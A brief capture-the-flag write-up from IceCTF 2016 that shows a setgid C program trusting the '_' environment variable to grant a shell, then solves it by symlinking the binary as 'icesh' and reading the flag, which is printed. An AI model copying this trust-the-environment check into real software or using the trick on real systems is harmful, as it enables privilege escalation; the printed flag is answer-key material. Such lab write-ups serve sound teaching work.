### Solved by superkojiman

Here's the source code for /home/demo/demo.c

```
$ cat  demo.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <libgen.h>
#include <string.h>

void give_shell() {
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    if(strncmp(basename(getenv("_")), "icesh", 6) == 0){
        give_shell();
    }
    else {
        printf("I'm sorry, your free trial has ended.\n");
    }
    return 0;
}
```

We can see that it checks if basename(getenv("_")) is equal to "icesh", and if it is, it gives us a shell. Easy way to solve it is just to symlink /home/demo/demo to ~/icesh

```
[ctf-87619@icectf-shell-2016 ~]$ ln -s /home/demo/demo icesh
[ctf-87619@icectf-shell-2016 ~]$ ./icesh
$ id
uid=1610(ctf-87619) gid=1007(demo) groups=1007(demo),1003(ctf)
$ cat /home/demo/flag.txt
IceCTF{wH0_WoU1d_3vr_7Ru5t_4rgV}
```
